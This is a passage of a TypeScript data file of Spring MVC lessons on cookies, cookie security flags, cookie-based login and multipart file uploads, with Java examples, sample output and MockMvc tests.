// Spring extras, batch smvc23 (keyed by topic id).
import { x, r, type Extra } from '../mysql/extras/extra';
import { dv, type Deep } from '../mysql/extras/deep';

export const smvc23Extras: Record<string, Extra> = {
    'mvc-creating-cookies': x(
        ['<b>Cookie</b>: a small name-value pair the server sends in a <code>Set-Cookie</code> response header; the browser stores it and returns it in the <code>Cookie</code> request header on later requests.',
            '<b>Create</b> one with <code>new Cookie(name, value)</code> and add it using <code>response.addCookie(cookie)</code> on the <code>HttpServletResponse</code>.',
            '<b>Set the path</b> with <code>setPath("/")</code> and a lifetime with <code>setMaxAge</code>; without a max age it is a session cookie that dies when the browser closes.'],
        ['<b>ResponseCookie</b>: the Spring builder (<code>ResponseCookie.from(name, value)</code>) supports <code>sameSite</code>, <code>maxAge(Duration)</code> and more, and is sent through <code>HttpHeaders.SET_COOKIE</code>.',
            '<b>Attributes</b>: <code>Path</code>, <code>Domain</code>, <code>Max-Age</code>, <code>Secure</code>, <code>HttpOnly</code> and <code>SameSite</code> decide where and how the browser sends the cookie.',
            '<b>Size limit</b>: a cookie is about 4 KB and a browser keeps only a limited number per domain, so store ids, not data.'],
        ['<b>Never trust</b> the value: the user can edit any cookie, so sign it or keep only an opaque id that maps to server-side data.',
            '<b>Defaults</b>: always set <code>HttpOnly</code>, <code>Secure</code> and a <code>SameSite</code> value on cookies that identify a user.',
            '<b>Privacy</b>: cookies that track users need consent under laws such as GDPR; keep the lifetime as short as the feature needs.'],
        [['F', 'What is a cookie?', 'A small piece of data the server asks the browser to store and send back on later requests to the same site.'],
            ['F', 'How do you create a cookie in Spring MVC?', 'Create a jakarta.servlet.http.Cookie and call response.addCookie, or build a ResponseCookie and add it as a Set-Cookie header.'],
            ['M', 'Why is Path important when creating a cookie?', 'The browser sends the cookie only for URLs under that path, so a cookie created at /app/login with no path may not reach /app/orders.'],
            ['M', 'Cookie or ResponseCookie?', 'ResponseCookie is the Spring builder and supports SameSite and Duration directly; the servlet Cookie is simpler but older.'],
            ['S', 'What is the difference between a session cookie and a persistent cookie?', 'A session cookie has no Max-Age or Expires and is dropped when the browser closes; a persistent cookie is kept until its expiry.'],
            ['S', 'Where should you store user data: in a cookie or on the server?', 'Keep sensitive and large data on the server and put only an opaque id in the cookie, since the client can read and change cookie values.']],
        [['Create a cookie with the servlet API.',
            r`@GetMapping("/theme/dark")
public String setTheme(HttpServletResponse response) {
    Cookie cookie = new Cookie("theme", "dark");
    cookie.setPath("/");
    cookie.setMaxAge(7 * 24 * 60 * 60);   // one week, in seconds
    response.addCookie(cookie);
    return "Theme saved";
}

// OUTPUT:
// HTTP/1.1 200
// Set-Cookie: theme=dark; Max-Age=604800; Expires=(varies); Path=/
// Theme saved`],
            ['Create a cookie with ResponseCookie.',
                r`@GetMapping("/lang/hi")
public ResponseEntity<String> setLang() {
    ResponseCookie cookie = ResponseCookie.from("lang", "hi")
        .path("/")
        .maxAge(Duration.ofDays(30))
        .sameSite("Lax")
        .build();
    return ResponseEntity.ok()
        .header(HttpHeaders.SET_COOKIE, cookie.toString())
        .body("Language saved");
}

// OUTPUT:
// Set-Cookie: lang=hi; Path=/; Max-Age=2592000; Expires=(varies); SameSite=Lax
// Language saved`]],
        [['Test that the cookie is created.',
            r`@WebMvcTest(ThemeController.class)
class ThemeControllerTest {
    @Autowired MockMvc mvc;

    @Test
    void createsThemeCookie() throws Exception {
        mvc.perform(get("/theme/dark"))
            .andExpect(status().isOk())
            .andExpect(cookie().value("theme", "dark"))
            .andExpect(cookie().maxAge("theme", 604800));
    }
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`],
            ['Create two cookies in one response.',
                r`@PostMapping("/prefs")
public void save(HttpServletResponse res) {
    Cookie a = new Cookie("theme", "dark");
    Cookie b = new Cookie("lang", "en");
    a.setPath("/");
    b.setPath("/");
    res.addCookie(a);   // each call adds its own Set-Cookie header
    res.addCookie(b);
}

// OUTPUT:
// Set-Cookie: theme=dark; Path=/
// Set-Cookie: lang=en; Path=/`]]
    ),

    'mvc-reading-cookies': x(
        ['<b>@CookieValue</b>: <code>@CookieValue("theme") String theme</code> binds a request cookie to a controller parameter.',
            '<b>Default</b>: if the cookie is missing the request fails with a 400 error, so use <code>required = false</code> or <code>defaultValue</code>.',
            '<b>All cookies</b>: <code>request.getCookies()</code> returns an array of <code>Cookie</code> objects, or <code>null</code> when the request has none.'],
        ['<b>Conversion</b>: <code>@CookieValue</code> uses the normal type converters, so an <code>int</code> or <code>Long</code> parameter works if the text is a valid number.',
            '<b>Only name and value</b>: the browser sends just the name and value; the server never sees Path, Max-Age or HttpOnly of a request cookie.',
            '<b>Optional</b>: <code>Optional&lt;String&gt;</code> also works as a parameter type for an optional cookie.'],
        ['<b>Resolver</b>: <code>ServletCookieValueMethodArgumentResolver</code> reads the cookie by name; a missing required cookie raises <code>MissingRequestCookieException</code>.',
            '<b>Validate</b> every cookie value because it is user input: check length, format and allowed values before using it.',
            '<b>Duplicates</b>: two cookies with the same name but different paths can both arrive, and the first one wins in <code>@CookieValue</code>.'],
        [['F', 'How do you read a cookie in Spring MVC?', 'Add a parameter annotated with @CookieValue("name"), or loop over request.getCookies().'],
            ['F', 'What happens if a required cookie is missing?', 'Spring throws MissingRequestCookieException and the response is 400 Bad Request.'],
            ['M', 'How do you make a cookie optional?', 'Use required = false, a defaultValue, or an Optional parameter.'],
            ['M', 'Why can request.getCookies() be null?', 'The servlet API returns null, not an empty array, when the request carries no Cookie header.'],
            ['S', 'Can the server read the Max-Age of a cookie sent by the browser?', 'No. The browser sends only name and value, so attributes cannot be read back.'],
            ['S', 'How do you handle a missing cookie globally?', 'Add an @ExceptionHandler or @ControllerAdvice method for MissingRequestCookieException that returns a clear response.']],
        [['Read one cookie with a default.',
            r`@GetMapping("/home")
public String home(
        @CookieValue(name = "theme", defaultValue = "light") String theme) {
    return "Theme is " + theme;
}

// OUTPUT:
// GET /home                      -> Theme is light
// GET /home (Cookie: theme=dark) -> Theme is dark`],
            ['Read all cookies.',
                r`@GetMapping("/cookies")
public List<String> all(HttpServletRequest request) {
    Cookie[] cookies = request.getCookies();
    if (cookies == null) return List.of();
    return Arrays.stream(cookies)
        .map(c -> c.getName() + "=" + c.getValue())
        .toList();
}

// OUTPUT:
// Cookie: theme=dark; lang=en
// ["theme=dark","lang=en"]`]],
        [['Test reading with MockMvc.',
            r`@Test
void readsThemeCookie() throws Exception {
    mvc.perform(get("/home").cookie(new Cookie("theme", "dark")))
        .andExpect(status().isOk())
        .andExpect(content().string("Theme is dark"));
}

@Test
void missingRequiredCookieIsBadRequest() throws Exception {
    mvc.perform(get("/need-cookie"))
        .andExpect(status().isBadRequest());
}

// OUTPUT:
// Tests run: 2, Failures: 0, Errors: 0, Skipped: 0`],
            ['Optional cookie and a typed cookie.',
                r`@GetMapping("/visits")
public String visits(
        @CookieValue(name = "visits", required = false) Integer visits) {
    int n = visits == null ? 1 : visits + 1;
    return "Visit number " + n;
}

// OUTPUT:
// GET /visits                    -> Visit number 1
// GET /visits (Cookie: visits=4) -> Visit number 5`]]
    ),

    'mvc-updating-cookies': x(
        ['<b>No update call</b>: HTTP has no "edit cookie" command; you update a cookie by sending a new <code>Set-Cookie</code> with the same name, path and domain.',
            '<b>Same identity</b>: a cookie is identified by name plus Path plus Domain; if any of them differs, the browser keeps two separate cookies.',
            '<b>Refresh the lifetime</b> the same way: send the cookie again with a new <code>Max-Age</code> to extend it (a sliding expiry).'],
        ['<b>Read then write</b>: read the old value with <code>@CookieValue</code>, compute the new value and add the cookie to the response.',
            '<b>Attributes must match</b>: set the same <code>Path</code> and <code>Domain</code> as when you created it, or you create a duplicate.',
            '<b>Counter pattern</b>: a visit counter reads the cookie, adds one and writes it back on every request.'],
        ['<b>Race</b>: two parallel requests can both read the same old value and both write the same new value, so a lost update happens; use the server for exact counters.',
            '<b>Change detection</b>: write the cookie only when the value changed to avoid extra header bytes on every response.',
            '<b>Signed values</b>: when a cookie carries a signed value, re-sign it on every update.'],
        [['F', 'How do you update a cookie?', 'Send a cookie with the same name, path and domain and a new value in a Set-Cookie header.'],
            ['F', 'Can the server change a cookie directly in the browser?', 'No. It only asks the browser, through a response header, to store the new value.'],
            ['M', 'Why do I sometimes see two cookies with the same name?', 'The Path or Domain of the new cookie differs from the old one, so the browser treats them as different cookies.'],
            ['M', 'How do you extend the life of a cookie on each visit?', 'Re-send it with a fresh Max-Age on each request, which gives a sliding expiry.'],
            ['S', 'Why is a cookie a poor place for an exact counter?', 'Concurrent requests overwrite each other and the user can edit the value; keep exact counts on the server.'],
            ['S', 'What do you do to update a cookie from JavaScript?', 'document.cookie can change it only if it is not HttpOnly; HttpOnly cookies can be changed only by the server.']],
        [['Visit counter updated on every request.',
            r`@GetMapping("/counter")
public String counter(
        @CookieValue(name = "visits", defaultValue = "0") int visits,
        HttpServletResponse response) {
    Cookie cookie = new Cookie("visits", String.valueOf(visits + 1));
    cookie.setPath("/");
    cookie.setMaxAge(365 * 24 * 60 * 60);
    response.addCookie(cookie);
    return "You have visited " + (visits + 1) + " times";
}

// OUTPUT:
// 1st request -> You have visited 1 times   (Set-Cookie: visits=1)
// 2nd request -> You have visited 2 times   (Set-Cookie: visits=2)`],
            ['Change the theme only when it differs.',
                r`@PostMapping("/theme")
public ResponseEntity<Void> change(
        @RequestParam String value,
        @CookieValue(name = "theme", defaultValue = "light") String old) {
    if (value.equals(old)) return ResponseEntity.noContent().build();
    ResponseCookie c = ResponseCookie.from("theme", value)
        .path("/").maxAge(Duration.ofDays(30)).build();
    return ResponseEntity.noContent()
        .header(HttpHeaders.SET_COOKIE, c.toString()).build();
}

// OUTPUT:
// value=dark (old=light) -> 204 with Set-Cookie: theme=dark
// value=dark (old=dark)  -> 204 with no Set-Cookie`]],
        [['Test the update.',
            r`@Test
void incrementsCounter() throws Exception {
    mvc.perform(get("/counter").cookie(new Cookie("visits", "4")))
        .andExpect(content().string("You have visited 5 times"))
        .andExpect(cookie().value("visits", "5"));
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`],
            ['Wrong: a different path creates a second cookie.',
                r`// created earlier with path "/"
Cookie wrong = new Cookie("theme", "blue");
wrong.setPath("/settings");        // different path -> a second cookie
response.addCookie(wrong);

Cookie right = new Cookie("theme", "blue");
right.setPath("/");                // same identity -> replaces the old one
response.addCookie(right);

// OUTPUT:
// Browser after "wrong": theme=dark (Path=/) and theme=blue (Path=/settings)
// Browser after "right": theme=blue (Path=/)`]]
    ),

    'mvc-deleting-cookies': x(
        ['<b>Delete by expiring</b>: send the cookie again with <code>Max-Age=0</code> (<code>setMaxAge(0)</code>) and the browser removes it at once.',
            '<b>Match the identity</b>: use the same name, Path and Domain as the original, or the browser will not find the cookie to delete.',
            '<b>Value</b> does not matter when deleting; an empty string is common.'],
        ['<b>Negative max age</b>: <code>setMaxAge(-1)</code> means a session cookie, not a delete; use <code>0</code> to delete.',
            '<b>ResponseCookie</b>: <code>ResponseCookie.from("name", "").maxAge(0).path("/").build()</code> produces the delete header.',
            '<b>Logout</b>: logging out should delete the login cookie and invalidate the session on the server.'],
        ['<b>Security attributes</b>: send the same <code>Secure</code>, <code>HttpOnly</code> and <code>SameSite</code> flags on the delete cookie, since some browsers compare them.',
            '<b>HttpOnly cookies</b> cannot be deleted from JavaScript, so provide a server endpoint such as <code>/logout</code>.',
            '<b>Delete is a hint</b>: the server cannot verify the deletion, so never rely on the client to forget sensitive data.'],
        [['F', 'How do you delete a cookie?', 'Send it again with the same name and path and Max-Age set to 0.'],
            ['F', 'What does setMaxAge(0) do?', 'It tells the browser to remove the cookie immediately.'],
            ['M', 'What does setMaxAge(-1) do?', 'It makes a session cookie that lasts until the browser closes; it does not delete anything.'],
            ['M', 'Why does my delete not work?', 'Usually the Path or Domain of the delete cookie differs from the original, so the browser sees a different cookie.'],
            ['S', 'How do you delete an HttpOnly cookie?', 'Only the server can, by sending the expiring Set-Cookie; JavaScript cannot touch HttpOnly cookies.'],
            ['S', 'What else must logout do besides deleting the cookie?', 'Invalidate the server-side session or token, because a copied cookie value would still be valid otherwise.']],
        [['Delete a cookie with the servlet API.',
            r`@GetMapping("/theme/clear")
public String clear(HttpServletResponse response) {
    Cookie cookie = new Cookie("theme", "");
    cookie.setPath("/");       // same path as when it was created
    cookie.setMaxAge(0);       // 0 = delete now
    response.addCookie(cookie);
    return "Theme cleared";
}

// OUTPUT:
// Set-Cookie: theme=; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:10 GMT; Path=/
// Theme cleared`],
            ['Logout deletes the cookie and the session.',
                r`@PostMapping("/logout")
public ResponseEntity<Void> logout(HttpSession session) {
    session.invalidate();
    ResponseCookie gone = ResponseCookie.from("JSESSIONID", "")
        .path("/").httpOnly(true).maxAge(0).build();
    return ResponseEntity.noContent()
        .header(HttpHeaders.SET_COOKIE, gone.toString()).build();
}

// OUTPUT:
// HTTP/1.1 204
// Set-Cookie: JSESSIONID=; Path=/; Max-Age=0; HttpOnly`]],
        [['Test the deletion.',
            r`@Test
void clearsThemeCookie() throws Exception {
    mvc.perform(get("/theme/clear").cookie(new Cookie("theme", "dark")))
        .andExpect(status().isOk())
        .andExpect(cookie().maxAge("theme", 0));
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`],
            ['Delete every cookie of the request.',
                r`@GetMapping("/reset")
public String reset(HttpServletRequest req, HttpServletResponse res) {
    Cookie[] cookies = req.getCookies();
    if (cookies != null) {
        for (Cookie c : cookies) {
            Cookie dead = new Cookie(c.getName(), "");
            dead.setPath("/");
            dead.setMaxAge(0);
            res.addCookie(dead);
        }
    }
    return "All cookies cleared";
}

// OUTPUT:
// Set-Cookie: theme=; Max-Age=0; Path=/
// Set-Cookie: lang=; Max-Age=0; Path=/`]]
    ),

    'mvc-secure-cookies': x(
        ['<b>Secure flag</b>: a cookie with <code>Secure</code> is sent by the browser only over HTTPS, so it cannot leak on plain HTTP.',
            '<b>Set it</b> with <code>cookie.setSecure(true)</code> or <code>ResponseCookie.from(...).secure(true)</code>.',
            '<b>Secure cookie</b> in practice means three flags together: <code>Secure</code>, <code>HttpOnly</code> and a <code>SameSite</code> value.'],
        ['<b>Needs HTTPS</b>: a Secure cookie is ignored by the browser on a plain HTTP page (except for localhost in modern browsers), so local tests may differ.',
            '<b>Session cookie</b>: configure it with <code>server.servlet.session.cookie.secure=true</code> in Spring Boot.',
            '<b>Prefixes</b>: the name prefix <code>__Host-</code> forces Secure, Path=/ and no Domain, which blocks subdomain tricks.'],
        ['<b>Behind a proxy</b>: when TLS ends at a load balancer, set <code>server.forward-headers-strategy=framework</code> so the app knows the request was HTTPS.',
            '<b>HSTS</b> (<code>Strict-Transport-Security</code>) makes the browser use HTTPS always, which complements Secure cookies.',
            '<b>Secure is not encryption</b> of the value: it protects transport only, so still keep secrets out of cookie values.'],
        [['F', 'What does the Secure attribute do?', 'The browser sends the cookie only over HTTPS connections.'],
            ['F', 'How do you set a cookie as secure in Spring?', 'Call cookie.setSecure(true), or use ResponseCookie.from(...).secure(true).'],
            ['M', 'How do you make the JSESSIONID cookie secure in Spring Boot?', 'Set server.servlet.session.cookie.secure=true, and also http-only=true and same-site as needed.'],
            ['M', 'Why does my Secure cookie not appear on http://localhost?', 'Browsers treat HTTP as insecure and may drop it; some allow localhost, so test over HTTPS or check the browser.'],
            ['S', 'What is the __Host- prefix?', 'A cookie name prefix that the browser accepts only when the cookie is Secure, has Path=/ and sets no Domain.'],
            ['S', 'Why is the cookie not Secure behind a reverse proxy?', 'The app sees plain HTTP from the proxy; enable forwarded-header handling so request.isSecure() is true.']],
        [['Secure cookie with all three flags.',
            r`@PostMapping("/login")
public ResponseEntity<String> login() {
    ResponseCookie cookie = ResponseCookie.from("auth", "token-123")
        .secure(true)
        .httpOnly(true)
        .sameSite("Strict")
        .path("/")
        .maxAge(Duration.ofHours(1))
        .build();
    return ResponseEntity.ok()
        .header(HttpHeaders.SET_COOKIE, cookie.toString())
        .body("Logged in");
}

// OUTPUT:
// Set-Cookie: auth=token-123; Path=/; Max-Age=3600; Expires=(varies); Secure; HttpOnly; SameSite=Strict`],
            ['Session cookie settings in application.properties.',
                r`server.servlet.session.cookie.secure=true
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.same-site=lax
server.servlet.session.cookie.name=SESSIONID
server.forward-headers-strategy=framework

# OUTPUT:
# Set-Cookie: SESSIONID=ABC123;
Path=/;
Secure;
HttpOnly;
SameSite=Lax`]],
        [['Test the flags.',
            r`@Test
void authCookieIsSecure() throws Exception {
    mvc.perform(post("/login"))
        .andExpect(cookie().secure("auth", true))
        .andExpect(cookie().httpOnly("auth", true));
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`],
            ['Force HTTPS with Spring Security.',
                r`@Bean
SecurityFilterChain chain(HttpSecurity http) throws Exception {
    http.requiresChannel(c -> c.anyRequest().requiresSecure());
    http.headers(h -> h.httpStrictTransportSecurity(
        hsts -> hsts.maxAgeInSeconds(31536000)));
    return http.build();
}

// OUTPUT:
// http://app/x -> 302 Location: https://app/x
// Strict-Transport-Security: max-age=31536000 ; includeSubDomains`]]
    ),

    'mvc-httponly': x(
        ['<b>HttpOnly</b> is a cookie flag that hides the cookie from JavaScript, so <code>document.cookie</code> cannot read it.',
            '<b>Purpose</b>: it limits the damage of an XSS attack, because an injected script cannot steal the session cookie.',
            '<b>Set it</b> with <code>cookie.setHttpOnly(true)</code> or <code>ResponseCookie.from(...).httpOnly(true)</code>.'],
        ['<b>Still sent</b>: the browser keeps sending an HttpOnly cookie with every matching request; only scripts are blocked.',
            '<b>Session cookie</b>: the servlet container marks <code>JSESSIONID</code> HttpOnly by default in Spring Boot; confirm with <code>server.servlet.session.cookie.http-only</code>.',
            '<b>Trade-off</b>: if your own JavaScript must read a value (a theme, for example), that cookie cannot be HttpOnly.'],
        ['<b>Not a full defence</b>: HttpOnly does not stop an XSS script from sending requests as the user, so also escape output and use a Content-Security-Policy.',
            '<b>CSRF token</b> cookies for single-page apps are an exception: they must be readable by script, so they are not HttpOnly.',
            '<b>Attribute only</b>: it is enforced by the browser, so it does not affect server code or tools like curl.'],
        [['F', 'What does HttpOnly do?', 'It stops JavaScript in the page from reading or changing the cookie.'],
            ['F', 'How do you set HttpOnly in Spring MVC?', 'Use cookie.setHttpOnly(true) or ResponseCookie.from(...).httpOnly(true).'],
            ['M', 'Is an HttpOnly cookie still sent to the server?', 'Yes. The browser sends it on every matching request; only script access is blocked.'],
            ['M', 'Which cookies should be HttpOnly?', 'Session and authentication cookies; any cookie that scripts do not need.'],
            ['S', 'Why does Angular or React sometimes need a non-HttpOnly cookie?', 'A CSRF token cookie such as XSRF-TOKEN must be read by script to be copied into a request header.'],
            ['S', 'Does HttpOnly prevent XSS?', 'No. It only prevents cookie theft by script; the attacker script can still act as the user, so output escaping is still required.']],
        [['HttpOnly cookie.',
            r`@GetMapping("/session/start")
public String start(HttpServletResponse response) {
    Cookie cookie = new Cookie("sid", UUID.randomUUID().toString());
    cookie.setHttpOnly(true);
    cookie.setPath("/");
    response.addCookie(cookie);
    return "Session started";
}

// OUTPUT:
// Set-Cookie: sid=3f2b...(varies); Path=/; HttpOnly
// In browser console: document.cookie  ->  ""   (sid is hidden)`],
            ['HttpOnly for the Boot session cookie.',
                r`server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.name=JSESSIONID

# OUTPUT:
# Set-Cookie: JSESSIONID=ABC123;
Path=/;
HttpOnly`]],
        [['Test the HttpOnly flag.',
            r`@Test
void sidIsHttpOnly() throws Exception {
    mvc.perform(get("/session/start"))
        .andExpect(cookie().exists("sid"))
        .andExpect(cookie().httpOnly("sid", true));
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`],
            ['A readable cookie must not be HttpOnly.',
                r`ResponseCookie csrf = ResponseCookie.from("XSRF-TOKEN", token)
    .httpOnly(false)       // script must copy it into the X-XSRF-TOKEN header
    .secure(true)
    .sameSite("Lax")
    .path("/")
    .build();

// OUTPUT:
// Set-Cookie: XSRF-TOKEN=abc; Path=/; Secure; SameSite=Lax`]]
    ),

    'mvc-samesite': x(
        ['<b>SameSite</b> tells the browser whether to send a cookie on cross-site requests; it is the main browser defence against CSRF.',
            '<b>Three values</b>: <code>Strict</code> (never cross-site), <code>Lax</code> (only top-level GET navigation) and <code>None</code> (always, but requires <code>Secure</code>).',
            '<b>Default</b>: modern browsers treat a cookie with no SameSite attribute as <code>Lax</code>.'],
        ['<b>Set it</b> with <code>ResponseCookie.from(...).sameSite("Lax")</code>; the servlet <code>Cookie</code> needs <code>setAttribute("SameSite", "Lax")</code> on Servlet 6.',
            '<b>Session cookie</b>: <code>server.servlet.session.cookie.same-site=lax</code> configures it in Spring Boot.',
            '<b>None</b> is needed for embedded or cross-site flows such as an iframe or a third-party widget, and must come with <code>Secure</code>.'],
        ['<b>Site, not origin</b>: "same site" means the same registrable domain (for example <code>shop.example.com</code> and <code>api.example.com</code> are same-site), which differs from CORS origins.',
            '<b>Strict breaks links</b>: a user following a link from email to your site arrives without the cookie, so they look logged out on the first page.',
            '<b>Not enough alone</b>: keep CSRF tokens for state-changing requests, because SameSite is a browser feature and older browsers ignore it.'],
        [['F', 'What is SameSite?', 'A cookie attribute that controls whether the browser sends the cookie on requests that come from another site.'],
            ['F', 'Name the SameSite values.', 'Strict, Lax and None.'],
            ['M', 'What is the difference between Lax and Strict?', 'Lax still sends the cookie on top-level GET navigations from other sites; Strict never sends it cross-site.'],
            ['M', 'When do you need SameSite=None?', 'For cross-site use such as embedded content or a separate front-end domain; it must also be Secure.'],
            ['S', 'Does SameSite replace CSRF protection?', 'No. It reduces CSRF risk but you should keep CSRF tokens because browser support and subdomain rules vary.'],
            ['S', 'Why does the user look logged out after clicking a link from email with Strict?', 'The cross-site navigation does not carry the Strict cookie, so the first request is anonymous.']],
        [['SameSite with ResponseCookie.',
            r`@PostMapping("/login")
public ResponseEntity<Void> login() {
    ResponseCookie cookie = ResponseCookie.from("auth", "token-123")
        .httpOnly(true).secure(true)
        .sameSite("Lax")
        .path("/")
        .build();
    return ResponseEntity.noContent()
        .header(HttpHeaders.SET_COOKIE, cookie.toString()).build();
}

// OUTPUT:
// Set-Cookie: auth=token-123; Path=/; Secure; HttpOnly; SameSite=Lax`],
            ['SameSite with the servlet Cookie (Servlet 6).',
                r`Cookie cookie = new Cookie("pref", "x");
cookie.setPath("/");
cookie.setSecure(true);
cookie.setAttribute("SameSite", "Strict");   // Servlet 6 / Spring Boot 3
response.addCookie(cookie);

// OUTPUT:
// Set-Cookie: pref=x; Path=/; Secure; SameSite=Strict`]],
        [['Test the header.',
            r`@Test
void loginCookieIsLax() throws Exception {
    mvc.perform(post("/login"))
        .andExpect(header().string(HttpHeaders.SET_COOKIE,
            containsString("SameSite=Lax")));
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`],
            ['Cross-site front-end needs None plus Secure.',
                r`ResponseCookie widget = ResponseCookie.from("widget", "1")
    .sameSite("None")
    .secure(true)          // browsers reject SameSite=None without Secure
    .path("/")
    .build();

// OUTPUT:
// Set-Cookie: widget=1; Path=/; Secure; SameSite=None`]]
    ),

    'mvc-cookie-based-authentication': x(
        ['<b>Idea</b>: after login the server sends a cookie holding a session id or token; the browser returns it on each request, and the server uses it to know who the user is.',
            '<b>Session-based</b>: the usual form is <code>JSESSIONID</code>; the cookie holds only an id and the user data stays in <code>HttpSession</code> on the server.',
            '<b>Flow</b>: login with credentials, server checks them, creates a session, sends the cookie; later requests carry the cookie and are treated as logged in.'],
        ['<b>Cookie flags</b>: the login cookie should be <code>HttpOnly</code>, <code>Secure</code> and <code>SameSite</code>, and have a limited lifetime.',
            '<b>Spring Security</b> does this for you: <code>UsernamePasswordAuthenticationFilter</code> authenticates and <code>SecurityContextHolder</code> plus the session keep the login.',
            '<b>Stateless variant</b>: the cookie can hold a signed token (such as a JWT) so the server keeps no session, at the cost of harder revocation.'],
        ['<b>Session fixation</b>: always change the session id after login; Spring Security does this by default (<code>changeSessionId</code>).',
            '<b>CSRF</b>: cookies are sent automatically, so state-changing requests need CSRF tokens or SameSite cookies.',
            '<b>Scaling</b>: session data must be shared across servers (sticky sessions or Spring Session with Redis) when you run several instances.'],
        [['F', 'How does cookie-based authentication work?', 'The server verifies the login, creates a session and sends its id in a cookie; the browser sends that cookie on each request.'],
            ['F', 'What is stored in the cookie: the user or an id?', 'Normally only an opaque session id; the user data stays on the server.'],
            ['M', 'What is session fixation and how is it avoided?', 'An attacker sets a known session id before login; changing the session id on login, which Spring Security does by default, stops it.'],
            ['M', 'Why is CSRF a concern with cookie authentication?', 'The browser attaches the cookie automatically, even to requests started by another site, so state-changing calls need CSRF tokens or SameSite.'],
            ['S', 'Cookie session or JWT?', 'Sessions are simple and easy to revoke but need shared storage when scaling; JWTs are stateless but hard to revoke, and still need safe cookie flags if stored in a cookie.'],
            ['S', 'How do you scale session cookies across servers?', 'Use Spring Session with a shared store such as Redis, or sticky sessions at the load balancer.']],
        [['Minimal login with HttpSession.',
            r`@PostMapping("/login")
public ResponseEntity<String> login(@RequestBody LoginRequest req,
                                    HttpServletRequest request) {
    if (!userService.check(req.username(), req.password())) {
        return ResponseEntity.status(401).body("Bad credentials");
    }
    request.changeSessionId();                       // stop session fixation
    request.getSession().setAttribute("user", req.username());
    return ResponseEntity.ok("Welcome " + req.username());
}

@GetMapping("/me")
public ResponseEntity<String> me(HttpSession session) {
    Object user = session.getAttribute("user");
    return user == null ? ResponseEntity.status(401).body("Not logged in")
                        : ResponseEntity.ok(user.toString());
}

// OUTPUT:
// POST /login -> 200 Welcome abaji   Set-Cookie: JSESSIONID=...(varies); Path=/; HttpOnly
// GET /me (with cookie) -> 200 abaji
// GET /me (no cookie)   -> 401 Not logged in`],
            ['Form login with Spring Security.',
                r`@Bean
SecurityFilterChain chain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(a -> a
            .requestMatchers("/login", "/css/**").permitAll()
            .anyRequest().authenticated())
        .formLogin(f -> f.loginPage("/login").defaultSuccessUrl("/home"))
        .logout(l -> l.deleteCookies("JSESSIONID")
                      .invalidateHttpSession(true));
    return http.build();
}

// OUTPUT:
// GET /home (anonymous) -> 302 Location: /login
// POST /login ok        -> 302 Location: /home  (new JSESSIONID cookie)
// POST /logout          -> 302 and JSESSIONID deleted`]],
        [['Test a protected endpoint with a session.',
            r`@Test
void meRequiresLogin() throws Exception {
    mvc.perform(get("/me")).andExpect(status().isUnauthorized());

    MockHttpSession session = new MockHttpSession();
    session.setAttribute("user", "abaji");
    mvc.perform(get("/me").session(session))
        .andExpect(status().isOk())
        .andExpect(content().string("abaji"));
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`],
            ['Test Spring Security form login.',
                r`@Test
void loginSetsSessionCookie() throws Exception {
    mvc.perform(formLogin("/login").user("abaji").password("secret"))
        .andExpect(authenticated().withUsername("abaji"))
        .andExpect(cookie().exists("JSESSIONID"));
}

// OUTPUT:
// Tests run: 1, Failures: 0, Errors: 0, Skipped: 0`]]
    ),

    'mvc-multipart-request': x(
        ['<b>Multipart request</b>: an HTTP request with <code>Content-Type: multipart/form-data</code> that carries several parts (text fields and files) separated by a boundary string.',
            '<b>Use</b>: file upload forms need <code>enctype="multipart/form-data"</code> and <code>method="post"</code>; a normal form encoding cannot carry files.',
            '<b>In Spring</b>: a <code>MultipartResolver</code> parses the request, and the controller receives <code>MultipartFile</code> parameters or <code>@RequestPart</code> values.'],
        ['<b>@RequestParam</b> binds a simple field or a file by part name; <b>@RequestPart</b> also converts a JSON part with an <code>HttpMessageConverter</code>.',
            '<b>consumes</b>: add <code>consumes = MediaType.MULTIPART_FORM_DATA_VALUE</code> to the mapping to accept only multipart requests.',
            '<b>Limits</b>: set <code>spring.servlet.multipart.max-file-size</code> and <code>max-request-size</code> to cap uploads.'],
        ['<b>Parsing</b>: Spring Boot registers <code>StandardServletMultipartResolver</code> and the servlet container (Tomcat) parses the parts; small parts stay in memory and big ones go to a temp file.',
            '<b>Too large</b>: exceeding a limit raises <code>MaxUploadSizeExceededException</code>, which you should handle with <code>@ExceptionHandler</code> and return 413.',
            '<b>Security</b>: treat file names, content type and content as untrusted; check size, type and store files outside the web root.'],
        [['F', 'What is a multipart request?', 'A request with Content-Type multipart/form-data that carries several parts, such as fields and files, split by a boundary.'],
            ['F', 'What must an HTML upload form have?', 'method="post" and enctype="multipart/form-data".'],
            ['M', 'Difference between @RequestParam and @RequestPart?', '@RequestParam binds simple values and files; @RequestPart additionally uses message converters, so a JSON part can become an object.'],
            ['M', 'How do you limit upload size?', 'Set spring.servlet.multipart.max-file-size and max-request-size; exceeding them throws MaxUploadSizeExceededException.'],
            ['S', 'Which component parses the multipart body in Spring Boot?', 'StandardServletMultipartResolver, which uses the servlet container multipart support (Part API).'],
            ['S', 'How do you send a JSON part and a file together?', 'Use @RequestPart for the JSON part and a MultipartFile for the file; the client sets the JSON part Content-Type to application/json.']],
        [['Controller that accepts a field and a file.',
            r`@RestController
class UploadController {
    @PostMapping(path = "/upload",
                 consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
    public String upload(@RequestParam String title,
                         @RequestParam("file") MultipartFile file) {
        return title + " : " + file.getOriginalFilename()
            + " (" + file.getSize() + " bytes)";
    }
}

// OUTPUT:
// curl -F title=Resume -F file=@cv.pdf http://localhost:8080/upload
// Resume : cv.pdf (48213 bytes)`],
            ['HTML form.',
                r`<form action="/upload" method="post" enctype="multipart/form-data">
    <input type="text" name="title">
    <input type="file" name="file">
    <button type="submit">Upload</button>
</form>

<!-- OUTPUT:
